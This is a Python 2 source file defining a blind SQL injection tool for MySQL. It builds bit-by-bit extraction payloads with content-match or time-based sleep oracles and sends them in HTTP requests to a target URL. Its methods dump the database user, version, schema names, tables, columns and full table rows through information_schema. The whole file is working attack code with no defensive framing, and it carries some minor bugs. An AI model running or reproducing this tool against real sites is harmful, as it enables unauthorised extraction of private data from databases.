#!/usr/bin/python
import requests
import urllib 
import re
import time
from progressbar import ProgressBar,Percentage,Bar
from termcolor import colored

class Bitshift:

	url=str()
	pattern=str()
	encodemode=str()
	reg_condition=str()
	debuglevel=0
	length=2000
	sleeptime=float(0)
	condition_target="content"
	break_on_null=True
	check_time=7
	cookies=dict()
	query=str()

	def encode(self,injection):
		if "space_to_plus" in self.encodemode:
			injection=injection.replace(" ","+")

		if "urllib_quote" in self.encodemode:
			injection=urllib.quote(injection)

		if "base64" in self.encodemode:
			injection=(injection).encode('base64')
			
		return injection

	def get_next(self,char_pos,bin_pos):
		
		if self.condition_target == "time_based": 
			P1="IF((SELECT(SUBSTR(LPAD(BIN(ORD(SUBSTR(("
			P2="),%d,1))),8,0),%d,1))),sleep(%d),1)"% (char_pos,bin_pos,self.check_time)
		else:
			P1="SELECT(SUBSTR(LPAD(BIN(ORD(SUBSTR(("
			P2="),%d,1))),8,0),%d,1))" % (char_pos,bin_pos)
		
		injection=((self.pattern.replace("__BITSHIFT(",P1,1)).replace(")__",P2,1)).replace("__QUERY__",self.query,1)
		
		if self.debuglevel>1:
			print colored("[~~] " + injection, 'yellow')
		
		injection=self.encode(injection)
		
		return injection

	def sleep(self):
		if self.sleep:
			time.sleep(float(self.sleeptime))		

	def make_request(self,injection):
		ret=str()

		maxtries=5
		numtry=0

		while (numtry<maxtries):
			try:
				if self.condition_target == "time_based":
					before=time.time()
							
				if self.debuglevel>2:
					print colored("[~~] REQUEST SENT : %s " %(self.url+injection), 'yellow')
							
				r=requests.get(self.url+injection,cookies=self.cookies)

				if self.condition_target == "content":
					if self.rg_condition.search(r.content):
						ret="1"
					else:
						ret="0"
				elif self.condition_target == "time_based":
					after=time.time()
					
					diff=after-before

					if diff>float(self.check_time):
						ret="1"
					else:
						ret="0"

				if self.debuglevel>2:
					print colored("[~~] REQUEST CONTENT DUMP "+"#"*30, 'yellow')
					print colored(r.content, 'yellow')
					print colored("#"*56, 'yellow')

				return ret
			except Exception as e:
				print colored("[EE] %s " % (str(e.message)), 'red')
				numtry+=1
				print colored("[EE] %d More tries left " % ((maxtries-numtry)), 'red')

	def getvalue(self):

		if not len(self.reg_condition):
			print colored("[EE] No condition to match...", 'red')
			return 

		self.rg_condition = re.compile(self.reg_condition)
		word=str()
		MAX=self.length+1

		pbar = ProgressBar(widgets=[Percentage(), Bar()], maxval=MAX).start()
		for position_char_bf in range(1,MAX):
			bindump=str()
			for postion_binary_bf in range(1,9):
				
				injection=self.get_next(position_char_bf,postion_binary_bf)
				
				self.sleep()

				bindump+=self.make_request(injection)

				pbar.update(position_char_bf+1)

			if self.debuglevel:
				print colored("[~~] CHAR %04d : %s [%s]" % (position_char_bf,chr(int(bindump,2)),bindump),'yellow')	
			
			if self.break_on_null and not int(bindump,2):
				break
			else:
				word+=chr(int(bindump,2))	

		pbar.finish()
		return word
		
		
	def get_current_user(self):
		self.query="user()"

		self.length=self.get_query_length()
		version_length= self.getvalue()

		user=self.getvalue()	

		if self.debuglevel>0:
			print colored("[**] Current user() : %s" % (user) , 'green')
			
		return user
		
	def get_version(self):
		self.query="@@version"

		self.length=self.get_query_length()
		version_length= self.getvalue()

		version=self.getvalue()
		
		if self.debuglevel>0:
			print colored("[**] Mysql Version : %s" % (version) , 'green')
			
		return version
		
	def get_current_db(self):
		self.query="database()"
		
		self.length=self.get_query_length()
		cur_db= self.getvalue()

		if self.debuglevel>0:
			print colored("[**] Current DB : %s" % (cur_db) , 'green')
			
		return cur_db
		
	def get_query_length(self):
		self.length=6
		base_query=self.query
		self.query="length((%s))" % (base_query)

		length=int(self.getvalue())

		if self.debuglevel>0:
			print colored("[**] Length : %04d" % (length) , 'green')
		
		self.query=	base_query
		
		return length
		
	def get_databases(self,exclude_bases):
		ret=[]

		# Count DB
		self.query="SELECT count(schema_name) FROM information_schema.schemata"
		
		#Adding exclusions
		first=True
		for exclusion in exclude_bases:
			if first:
				self.query+=" WHERE schema_name!=0x%s" % (exclusion.encode("hex"))
				first=False
			else:
				self.query+=" AND schema_name!=0x%s" % (exclusion.encode("hex"))
			
		tables_count=int(self.getvalue())

		if self.debuglevel>0:
			print colored("[**] Databases Count : %04d" % (tables_count) , 'green')

		for i in range(0,tables_count):
			self.query="SELECT schema_name FROM information_schema.schemata"
			
			#Adding exclusions
			first=True
			for exclusion in exclude_bases:
				if first:
					self.query+=" WHERE schema_name!=0x%s" % (exclusion.encode("hex"))
					first=False
				else:
					self.query+=" AND schema_name!=0x%s" % (exclusion.encode("hex"))

			self.query+=" LIMIT 1 OFFSET %d" % (i)
			
			self.length=self.get_query_length()

			db_name=self.getvalue()
			
			if self.debuglevel>0:
				print colored("[**] Database %04d : %s" % (i,db_name) , 'green')
				
			ret.append(db_name)
		
		return ret
		
	def get_tables_names(self,schema):
		ret=[]
		
		# Count Tables
		self.query="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=0x%s" % (schema.encode("hex"))

		tables_count=int(self.getvalue())

		if self.debuglevel>0:
			print colored("[**] Tables Count: %04d" % (tables_count), 'green')

		for i in range(0,tables_count):
			self.query="SELECT table_name FROM information_schema.tables WHERE table_schema=0x%s LIMIT 1 OFFSET %d" % (schema.encode("hex"),i)
			
			self.length=self.get_query_length()

			table_name=self.getvalue()
			
			if self.debuglevel>0:
				print colored("[**] Table %04d : %s" % (i,table_name) , 'green')
		
			ret.append(table_name)
		
		return ret
		
	def get_columns_names(self,table,schema):
		ret=[]
		
		# Count Columns
		self.query="SELECT COUNT(column_name) from information_schema.columns where table_name=0x%s AND table_schema=0x%s" % (table.encode("hex"),schema.encode("hex"))

		column_count=int(self.getvalue())	

		if self.debuglevel>0:
			print colored("[**] Table %s columns count : %04d" % (table,column_count) , 'green')

		for i in range (0,column_count):
			self.query="SELECT column_name FROM information_schema.columns WHERE table_name=0x%s AND table_schema=0x%s LIMIT 1 OFFSET %d" % (table.encode("hex"),schema.encode("hex"),i)

			self.length=self.get_query_length()

			column_name=self.getvalue()
				
			if self.debuglevel>0:
				print colored("[**] Column %04d : %s" % (i,column_name) , 'green')
				
			ret.append(column_name)
		
		return ret
			
	def get_entries(self,table,schema,columns):
		ret=[]
		
		self.query="SELECT COUNT(%s) FROM %s.%s" % (columns[0],schema,table)

		entries_count=int(self.getvalue())	

		if self.debuglevel>0:
			print colored("[**] Entries count : %04d" % (entries_count) , 'green')

		for i in range (0,entries_count):
			columns_concat=self.get_concat_str(columns)
			self.query="SELECT %s from %s.%s LIMIT 1 OFFSET %d" % (columns_concat,schema,table,i)

			self.length=self.get_query_length()

			entry=self.getvalue()
			
			if self.debuglevel>0:
				print colored("[**] Entry %04d : %s" % (i,str(entry)) , 'green')
				
			ret.append(entry)
		
		return ret
			
			
	def get_concat_str(self,columns):
		concat_str=str()
		first=True
		
		colindex=0
		while colindex<len(columns):
			if not first:
				concat_str+=","
				first=False
				
			concat_str+="(CONCAT_WS(0x3a,%s," % (columns[colindex])
			
			colindex+=1
			
		concat_str+='0x20'
			
		for col in columns:
			concat_str+="))"
			
		return concat_str
		
	def get_tables_names_like(self,schema,like):
		ret=[]
		
		like="%"+like+"%"
		# Count Tables
		self.query="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=0x%s AND table_name LIKE 0x%s" % (schema.encode("hex"),like.encode("hex"))

		tables_count=int(self.getvalue())

		if self.debuglevel>0:
			print colored("[**] Tables Count: %04d" % (tables_count), 'green')

		for i in range(0,tables_count):
			self.query="SELECT table_name FROM information_schema.tables WHERE table_schema=0x%s AND table_name LIKE 0x%s LIMIT 1 OFFSET %d" % (schema.encode("hex"),like.encode("hex"),i)
			
			self.length=self.get_query_length()

			table_name=self.getvalue()
			
			if self.debuglevel>0:
				print colored("[**] Table %04d : %s" % (i,table_name) , 'green')
		
			ret.append(table_name)
		
		return ret		

	def get_column_name_like(self,table,schema,like):
		ret=[]
		
		like="%"+like+"%"
		# Count Columns
		self.query="SELECT COUNT(column_name) from information_schema.columns where table_name=0x%s AND table_schema=0x%s AND column_name LIKE 0x%s" % (table.encode("hex"),schema.encode("hex"),like.encode("hex"))

		column_count=int(self.getvalue())	

		if self.debuglevel>0:
			print colored("[**] Table %s columns count : %04d" % (table,column_count) , 'green')

		for i in range (0,column_count):
			self.query="SELECT column_name FROM information_schema.columns WHERE table_name=0x%s AND table_schema=0x%s  AND column_name LIKE 0x%s LIMIT 1 OFFSET %d" % (table.encode("hex"),schema.encode("hex"),like.encode("hex"),i)

			self.length=self.get_query_length()

			column_name=self.getvalue()
				
			if self.debuglevel>0:
				print colored("[**] Column %04d : %s" % (i,column_name) , 'green')
				
			ret.append(column_name)
		
		return ret


